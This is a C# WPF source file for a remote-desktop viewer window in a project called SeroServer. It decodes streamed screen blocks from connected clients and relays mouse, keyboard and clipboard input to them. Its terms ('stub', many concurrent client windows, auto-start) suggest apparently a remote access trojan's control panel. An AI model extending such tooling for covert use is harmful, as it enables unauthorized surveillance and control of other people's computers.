using System.IO;
using System.Text.Json;
using System.Windows;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class RemoteDesktopWindow : Window
{
    // Stagger auto-start across simultaneously opened windows to avoid a burst of
    // RdpStart packets all firing at the same time when the user opens many windows.
    private static int _openCount = 0;

    // Global cap on concurrent JPEG decode work across all open RDP windows.
    // Each window's Parallel.ForEach is bounded to 2 threads; this semaphore
    // prevents all N windows from saturating the thread pool simultaneously.
    private static readonly SemaphoreSlim _decodeSlots =
        new(Math.Max(2, Environment.ProcessorCount / 2),
            Math.Max(2, Environment.ProcessorCount / 2));

    private readonly TlsServer _server;
    private readonly string _clientId;
    private int _remoteW, _remoteH;
    private volatile int _screenW, _screenH;
    private int _frameCount;
    private DateTime _fpsTime = DateTime.UtcNow;
    private int _quality = 75;
    private volatile bool _renderBusy;
    private volatile bool _streaming;
    private volatile bool _closed;
    private volatile bool _updatingMonitors;
    private WriteableBitmap? _frame;
    private readonly List<(int Index, string Name, int X, int Y, int W, int H)> _monitors = [];
    private bool _uiReady;
    private bool _autoStarted;

    public RemoteDesktopWindow(TlsServer server, string clientId)
    {
        _server   = server;
        _clientId = clientId;
        InitializeComponent();
        WindowResizer.Enable(this);
        _uiReady = true;

        Title = $"Remote Desktop — {clientId}";
        SldQuality.Value = UiPrefs.GetInt("RdpQuality", 75);
        TxtQuality.Text  = $"{(int)SldQuality.Value}";
        SldScale.Value   = UiPrefs.GetInt("RdpScale", 100);
        TxtScale.Text    = $"{(int)SldScale.Value}%";
        SldQuality.ValueChanged += (_, e) => { TxtQuality.Text = $"{(int)e.NewValue}"; _quality = (int)e.NewValue; UiPrefs.Set("RdpQuality", (int)e.NewValue); };
        SldScale.ValueChanged   += (_, e) => { TxtScale.Text = $"{(int)e.NewValue}%"; UiPrefs.Set("RdpScale", (int)e.NewValue); };

        // Restore checkbox states from previous session
        ChkClicks.IsChecked    = UiPrefs.GetInt("RdpClicks",    1) == 1;
        ChkCursor.IsChecked    = UiPrefs.GetInt("RdpCursor",    1) == 1;
        ChkKeyboard.IsChecked  = UiPrefs.GetInt("RdpKeyboard",  1) == 1;
        ChkClipboard.IsChecked = UiPrefs.GetInt("RdpClipboard", 0) == 1;

        // Reclaim keyboard focus on ImgFrame whenever focus leaves it.
        // Clicking the checkboxes in the status bar steals focus, which also
        // breaks MouseMove routing on the Focusable Image element.
        Activated       += (_, _) => { if (_streaming) ImgFrame.Focus(); };
        SizeChanged     += (_, _) => { if (_streaming) ImgFrame.Focus(); };
        ChkClicks.Checked   += (_, _) => { UiPrefs.Set("RdpClicks",    1); if (_streaming) ImgFrame.Focus(); };
        ChkClicks.Unchecked += (_, _) =>   UiPrefs.Set("RdpClicks",    0);
        ChkCursor.Checked   += (_, _) => { UiPrefs.Set("RdpCursor",    1); if (_streaming) ImgFrame.Focus(); };
        ChkCursor.Unchecked += (_, _) =>   UiPrefs.Set("RdpCursor",    0);
        ChkKeyboard.Checked   += (_, _) => { UiPrefs.Set("RdpKeyboard",  1); if (_streaming) ImgFrame.Focus(); };
        ChkKeyboard.Unchecked += (_, _) =>   UiPrefs.Set("RdpKeyboard",  0);
        ChkClipboard.Checked   += (_, _) => UiPrefs.Set("RdpClipboard", 1);
        ChkClipboard.Unchecked += (_, _) => UiPrefs.Set("RdpClipboard", 0);

        // Use O(1) per-client handler instead of broadcast event — critical for 100+ open windows
        _server.RegisterHandler(clientId, PacketType.RdpFrame,
            pkt => OnFrame(clientId, pkt.Data));
        _server.RegisterHandler(clientId, PacketType.RdpClipboard, pkt =>
        {
            var d = Newtonsoft.Json.JsonConvert.DeserializeObject<RdpClipboardData>(pkt.Data);
            if (d?.Text is { Length: > 0 }) OnRemoteClipboard(clientId, d.Text);
        });
        _server.ClientDisconnected += OnClientDisconnected;

        Closed += (_, _) =>
        {
            _closed = true;
            _server.UnregisterHandler(clientId, PacketType.RdpFrame);
            _server.UnregisterHandler(clientId, PacketType.RdpClipboard);
            _server.ClientDisconnected -= OnClientDisconnected;
            if (_streaming) SendStop();
        };

        TxtClientId.Text = $"[ {clientId} ]";
        TxtStatus.Text = "Connecting...";

        // Fade-in animation on open
        Opacity = 0;
        Loaded += (_, _) =>
        {
            var anim = new System.Windows.Media.Animation.DoubleAnimation(0, 1,
                TimeSpan.FromMilliseconds(180));
            BeginAnimation(OpacityProperty, anim);
            // Request monitor list on open
            _ = _server.SendToClient(_clientId,
                new Packet { Type = PacketType.RdpGetMonitors, Data = "{}" });
        };
    }

    // ── Fullscreen toggle ─────────────────────────────────────────────────────

    private void BtnFullscreen_Click(object s, RoutedEventArgs e)
    {
        if (WindowState == WindowState.Maximized)
        {
            WindowState = WindowState.Normal;
            RootBorder.CornerRadius = new CornerRadius(10);
            BtnFullscreen.Content = "⛶";
        }
        else
        {
            WindowState = WindowState.Maximized;
            RootBorder.CornerRadius = new CornerRadius(0); // no rounded corners when fullscreen
            BtnFullscreen.Content = "❐";
        }
    }

    // ── Button state ──────────────────────────────────────────────────────────

    private void SetStreamingState(bool streaming)
    {
        _streaming = streaming;
        Dispatcher.BeginInvoke(() =>
        {
            BtnStart.IsEnabled   = !streaming;
            BtnStart.Opacity     = streaming ? 0.35 : 1.0;
            BtnStop.IsEnabled    = streaming;
            BtnStop.Opacity      = streaming ? 1.0 : 0.35;
            SldQuality.IsEnabled = !streaming;
            SldScale.IsEnabled   = !streaming;
            CmbMonitor.IsEnabled = !streaming;
            TxtStatus.Text       = streaming ? "Streaming..." : "Stopped";
            LiveBadge.Visibility = streaming ? Visibility.Visible : Visibility.Collapsed;
            PnlNoSession.Visibility = streaming ? Visibility.Collapsed : Visibility.Visible;
            if (!streaming) TxtFps.Text = "";
        });
    }

    // ── Outgoing ──────────────────────────────────────────────────────────────

    private void SendStart()
    {
        var data = Newtonsoft.Json.JsonConvert.SerializeObject(new
        {
            Quality   = (int)SldQuality.Value,
            Fps       = 0,
            Scale     = (int)SldScale.Value,
            Monitor   = CmbMonitor.SelectedIndex >= 0 ? CmbMonitor.SelectedIndex : 0,
            Mouse     = ChkClicks.IsChecked == true || ChkCursor.IsChecked == true,
            Keyboard  = ChkKeyboard.IsChecked == true,
            Clipboard = ChkClipboard.IsChecked == true,
        });
        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.RdpStart, Data = data });
        SetStreamingState(true);
    }

    private void SendStop()
    {
        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.RdpStop, Data = "{}" });
        SetStreamingState(false);
    }

    private void SendInputPacket(RdpInputData inp) =>
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.RdpInput,
            Data = Newtonsoft.Json.JsonConvert.SerializeObject(inp)
        });

    private void SendClipboard(string text) =>
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.RdpClipboard,
            Data = $"{{\"Text\":{Newtonsoft.Json.JsonConvert.SerializeObject(text)}}}"
        });

    // ── Incoming frames — block-based (Pulsar-style) ──────────────────────────

    private void OnFrame(string clientId, string json)
    {
        if (_closed || clientId != _clientId) return;

        if (json.Contains("\"monitors\""))
        {
            Dispatcher.BeginInvoke(() => UpdateMonitorList(json));
            return;
        }

        if (!_streaming) return;
        // If busy rendering the previous frame, return the credit so the stub keeps
        // its pipeline full — without this the 8 in-flight credits drain and the stream freezes.
        if (_renderBusy) { if (!_closed) SendAck(); return; }
        _renderBusy = true;

        Task.Run(async () =>
        {
            await _decodeSlots.WaitAsync();
            try
            {
                using var doc = JsonDocument.Parse(json);
                var root = doc.RootElement;
                int w = root.GetProperty("w").GetInt32();
                int h = root.GetProperty("h").GetInt32();
                if (root.TryGetProperty("sw", out var swEl)) _screenW = swEl.GetInt32();
                if (root.TryGetProperty("sh", out var shEl)) _screenH = shEl.GetInt32();

                // Decode each changed block off the UI thread
                if (!root.TryGetProperty("blocks", out var blocksEl))
                {
                    // Full-frame fallback ("j" key)
                    if (root.TryGetProperty("j", out var jEl))
                    {
                        var jpegBytes = Convert.FromBase64String(jEl.GetString() ?? "");
                        var pixels = DecodeJpeg(jpegBytes, w, h);
                        if (pixels != null && !_closed)
                            _ = Dispatcher.BeginInvoke(() => BlitFullFrame(w, h, pixels, w * 4));
                        else
                        {
                            // Decode failed — still ack so the stub keeps sending frames
                            _renderBusy = false;
                            if (!_closed) SendAck();
                        }
                    }
                    else { _renderBusy = false; }
                    return;
                }

                // Block-based: decode blocks in parallel, capped at ProcessorCount
                var blockList = blocksEl.EnumerateArray().ToList();
                var decoded   = new System.Collections.Concurrent.ConcurrentBag<(int X, int Y, int W, int H, byte[] Pixels, int Stride)>();
                Parallel.ForEach(blockList,
                    new ParallelOptions { MaxDegreeOfParallelism = 2 },
                    block =>
                    {
                        try
                        {
                            int bx = block.GetProperty("x").GetInt32();
                            int by = block.GetProperty("y").GetInt32();
                            int bw = block.GetProperty("w").GetInt32();
                            int bh = block.GetProperty("h").GetInt32();
                            string j64 = block.GetProperty("j").GetString() ?? "";
                            if (string.IsNullOrEmpty(j64)) return;
                            var pix = DecodeJpeg(Convert.FromBase64String(j64), bw, bh);
                            if (pix != null) decoded.Add((bx, by, bw, bh, pix, bw * 4));
                        }
                        catch { }
                    });
                var decodedList = decoded.ToList();

                if (_closed) { _renderBusy = false; return; }
                // ACK early — stub can start capturing the next frame while we blit the current one.
                // Reduces stub idle time from (decode+blit+RTT) to (decode+RTT), cutting effective
                // latency nearly in half and allowing the pipeline to stay full at high framerates.
                if (!_closed) SendAck();
                _ = Dispatcher.BeginInvoke(() => BlitBlocks(w, h, decodedList, ackAlreadySent: true));
            }
            catch { _renderBusy = false; if (!_closed) SendAck(); }
            finally { _decodeSlots.Release(); }
        });
    }

    private static byte[]? DecodeJpeg(byte[] jpegBytes, int expectedW, int expectedH)
    {
        try
        {
            using var ms = new MemoryStream(jpegBytes);
            var dec  = BitmapDecoder.Create(ms, BitmapCreateOptions.None, BitmapCacheOption.OnLoad);
            var conv = new FormatConvertedBitmap(dec.Frames[0], PixelFormats.Bgra32, null, 0);
            int stride = expectedW * 4;
            var pixels = new byte[stride * expectedH];
            conv.CopyPixels(pixels, stride, 0);
            return pixels;
        }
        catch { return null; }
    }

    private void BlitFullFrame(int w, int h, byte[] pixels, int stride)
    {
        try
        {
            if (_closed) { _renderBusy = false; return; }
            EnsureFrame(w, h);
            _frame!.Lock();
            _frame.WritePixels(new Int32Rect(0, 0, w, h), pixels, stride, 0);
            _frame.Unlock();
            UpdateFps();
            _renderBusy = false;
            SendAck();
        }
        catch { _renderBusy = false; }
    }

    private void BlitBlocks(int w, int h, List<(int X, int Y, int W, int H, byte[] Pixels, int Stride)> blocks, bool ackAlreadySent = false)
    {
        try
        {
            if (blocks.Count == 0) { _renderBusy = false; if (!_closed && !ackAlreadySent) SendAck(); return; }
            if (_closed) { _renderBusy = false; return; }
            EnsureFrame(w, h);
            _frame!.Lock();
            foreach (var (bx, by, bw, bh, pix, stride) in blocks)
            {
                try { _frame.WritePixels(new Int32Rect(bx, by, bw, bh), pix, stride, 0); }
                catch { }
            }
            _frame.Unlock();
            UpdateFps();
            _renderBusy = false;
            if (!_closed && !ackAlreadySent) SendAck();
        }
        catch { _renderBusy = false; }
    }

    // ── Close feature window when client disconnects / uninstalls ─────────────

    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
    {
        if (c.Id != _clientId) return;
        Dispatcher.BeginInvoke(Close);
    }

    private void EnsureFrame(int w, int h)
    {
        if (_frame != null && _frame.PixelWidth == w && _frame.PixelHeight == h) return;
        _frame = new WriteableBitmap(w, h, 96, 96, PixelFormats.Bgra32, null);
        ImgFrame.Source = _frame;
        _remoteW = w; _remoteH = h;
        TxtResolution.Text = $"{w}×{h}";
    }

    private void UpdateFps()
    {
        _frameCount++;
        var now = DateTime.UtcNow;
        if ((now - _fpsTime).TotalSeconds >= 1)
        {
            TxtFps.Text = $"{_frameCount} fps";
            _frameCount = 0; _fpsTime = now;
        }
    }

    private void SendAck() =>
        _ = _server.SendToClient(_clientId,
            new Packet { Type = PacketType.RdpFrameAck, Data = "{}" });

    // ── Monitor list ──────────────────────────────────────────────────────────

    private void UpdateMonitorList(string json)
    {
        try
        {
            using var doc = JsonDocument.Parse(json);
            var mons = doc.RootElement.GetProperty("monitors");
            _monitors.Clear();
            _updatingMonitors = true;
            CmbMonitor.Items.Clear();
            foreach (var m in mons.EnumerateArray())
            {
                int i  = m.GetProperty("i").GetInt32();
                string nm = m.GetProperty("name").GetString() ?? $"Display {i + 1}";
                int mx = m.TryGetProperty("x", out var xEl) ? xEl.GetInt32() : 0;
                int my = m.TryGetProperty("y", out var yEl) ? yEl.GetInt32() : 0;
                int mw = m.GetProperty("w").GetInt32();
                int mh = m.GetProperty("h").GetInt32();
                _monitors.Add((i, nm, mx, my, mw, mh));
                // Clean display name: strip \\.\DISPLAY prefix
                string label = nm.StartsWith("\\\\.\\") ? nm[4..] : nm;
                CmbMonitor.Items.Add($"{i + 1}: {label} ({mw}×{mh})");
            }
            if (CmbMonitor.Items.Count > 0)
                CmbMonitor.SelectedIndex = 0;

            // Auto-start on first monitor list received.
            // Stagger by window index (150ms apart) so opening 20 windows at once
            // doesn't blast 20 RdpStart packets simultaneously.
            if (!_autoStarted && CmbMonitor.Items.Count > 0)
            {
                _autoStarted = true;
                int idx = Interlocked.Increment(ref _openCount);
                int delay = 300 + (idx % 20) * 150;
                Task.Delay(delay).ContinueWith(_ => Dispatcher.BeginInvoke(SendStart));
            }
        }
        catch { }
        finally { _updatingMonitors = false; }
    }

    private void OnRemoteClipboard(string clientId, string text)
    {
        if (_closed || clientId != _clientId) return;
        Dispatcher.BeginInvoke(() => { try { Clipboard.SetText(text); } catch { } });
    }

    // ── UI events ─────────────────────────────────────────────────────────────

    private void BtnStart_Click(object s, RoutedEventArgs e) => SendStart();
    private void BtnStop_Click(object s, RoutedEventArgs e)  => SendStop();

    private void CmbMonitor_Changed(object s, System.Windows.Controls.SelectionChangedEventArgs e)
    {
        if (!_uiReady || !_streaming || _updatingMonitors) return;
        SendStop();
        Task.Delay(200).ContinueWith(_ => Dispatcher.BeginInvoke(SendStart));
    }

    // ── Mouse ─────────────────────────────────────────────────────────────────

    // Convert a click position inside ImgFrame to remote screen coordinates.
    // Stretch=Fill means the image fills the control exactly — no letterboxing.
    private Point ToRemote(Point local)
    {
        if (_remoteW == 0 || ImgFrame.ActualWidth == 0 || ImgFrame.ActualHeight == 0) return local;

        int sw = _screenW > 0 ? _screenW : _remoteW;
        int sh = _screenH > 0 ? _screenH : _remoteH;

        double rx = local.X / ImgFrame.ActualWidth  * sw;
        double ry = local.Y / ImgFrame.ActualHeight * sh;

        int sel = CmbMonitor.SelectedIndex;
        if (sel >= 0 && sel < _monitors.Count)
        {
            rx += _monitors[sel].X;
            ry += _monitors[sel].Y;
        }
        return new Point(rx, ry);
    }

    private void Img_MouseMove(object s, MouseEventArgs e)
    {
        if (ChkCursor.IsChecked != true || !_streaming) return;
        var local = e.GetPosition(ImgFrame);
        var p = ToRemote(local);
        TxtStatus.Text = $"Mouse → remote ({(int)p.X},{(int)p.Y})  img {(int)ImgFrame.ActualWidth}×{(int)ImgFrame.ActualHeight}";
        SendInputPacket(new RdpInputData { T = "mm", X = (int)p.X, Y = (int)p.Y });
    }

    private void Img_MouseDown(object s, MouseButtonEventArgs e)
    {
        ImgFrame.Focus();
        if (ChkClicks.IsChecked != true || !_streaming) return;
        var p = ToRemote(e.GetPosition(ImgFrame));
        // When cursor tracking is off, the remote cursor may be anywhere.
        // Send a move first so the click lands at the correct position.
        if (ChkCursor.IsChecked != true)
            SendInputPacket(new RdpInputData { T = "mm", X = (int)p.X, Y = (int)p.Y });
        int btn = e.ChangedButton == MouseButton.Left ? 0 : e.ChangedButton == MouseButton.Right ? 1 : 2;
        SendInputPacket(new RdpInputData { T = "mc", X = (int)p.X, Y = (int)p.Y, Button = btn, Down = true });
    }

    private void Img_MouseUp(object s, MouseButtonEventArgs e)
    {
        if (ChkClicks.IsChecked != true || !_streaming) return;
        var p = ToRemote(e.GetPosition(ImgFrame));
        int btn = e.ChangedButton == MouseButton.Left ? 0 : e.ChangedButton == MouseButton.Right ? 1 : 2;
        SendInputPacket(new RdpInputData { T = "mc", X = (int)p.X, Y = (int)p.Y, Button = btn, Down = false });
    }

    private void Img_MouseWheel(object s, MouseWheelEventArgs e)
    {
        if (ChkClicks.IsChecked != true || !_streaming) return;
        SendInputPacket(new RdpInputData { T = "mw", WheelDelta = e.Delta });
    }

    // ── Keyboard ──────────────────────────────────────────────────────────────

    private void Img_KeyDown(object s, KeyEventArgs e)
    {
        e.Handled = true;
        if (ChkKeyboard.IsChecked != true || !_streaming) return;
        int vk = KeyInterop.VirtualKeyFromKey(e.Key);
        bool ext = e.Key is Key.Insert or Key.Delete or Key.Home or Key.End
                       or Key.PageUp or Key.PageDown or Key.Up or Key.Down or Key.Left or Key.Right;
        SendInputPacket(new RdpInputData { T = "kk", VK = vk, Down = true, Extended = ext });
        if (ChkClipboard.IsChecked == true && e.Key == Key.V && Keyboard.Modifiers.HasFlag(ModifierKeys.Control))
        {
            try { var t = Clipboard.GetText(); if (!string.IsNullOrEmpty(t)) SendClipboard(t); } catch { }
        }
    }

    private void Img_KeyUp(object s, KeyEventArgs e)
    {
        e.Handled = true;
        if (ChkKeyboard.IsChecked != true || !_streaming) return;
        SendInputPacket(new RdpInputData { T = "kk", VK = KeyInterop.VirtualKeyFromKey(e.Key), Down = false });
    }

    // ── Special keys ──────────────────────────────────────────────────────────

    // Sends a key-down for every key in order, then key-up in reverse order.
    // VK_LWIN (0x5B) and similar extended keys need Extended=true for SendInput.
    private void SendKeyCombo(params (int vk, bool ext)[] keys)
    {
        if (!_streaming) return;
        for (int i = 0; i < keys.Length; i++)
            SendInputPacket(new RdpInputData { T = "kk", VK = keys[i].vk, Down = true,  Extended = keys[i].ext });
        for (int i = keys.Length - 1; i >= 0; i--)
            SendInputPacket(new RdpInputData { T = "kk", VK = keys[i].vk, Down = false, Extended = keys[i].ext });
        ImgFrame.Focus();
    }

    private void BtnWin_Click   (object s, RoutedEventArgs e) => SendKeyCombo((0x5B, true));
    private void BtnWinR_Click  (object s, RoutedEventArgs e) => SendKeyCombo((0x5B, true), (0x52, false));
    private void BtnWinD_Click  (object s, RoutedEventArgs e) => SendKeyCombo((0x5B, true), (0x44, false));
    private void BtnWinE_Click  (object s, RoutedEventArgs e) => SendKeyCombo((0x5B, true), (0x45, false));
    private void BtnAltTab_Click(object s, RoutedEventArgs e) => SendKeyCombo((0x12, false), (0x09, false));
    private void BtnPrtSc_Click (object s, RoutedEventArgs e) => SendKeyCombo((0x2C, false));

    private void Img_Loaded(object s, RoutedEventArgs e) => ImgFrame.Focus();
    private void Close_Click(object s, RoutedEventArgs e)  => Close();
    private void TitleBar_Drag(object s, MouseButtonEventArgs e)
    {
        if (WindowState == WindowState.Normal) DragMove();
    }

    private void ResizeGrip_DragDelta(object s, System.Windows.Controls.Primitives.DragDeltaEventArgs e)
    {
        Width  = Math.Max(MinWidth,  Width  + e.HorizontalChange);
        Height = Math.Max(MinHeight, Height + e.VerticalChange);
    }
}
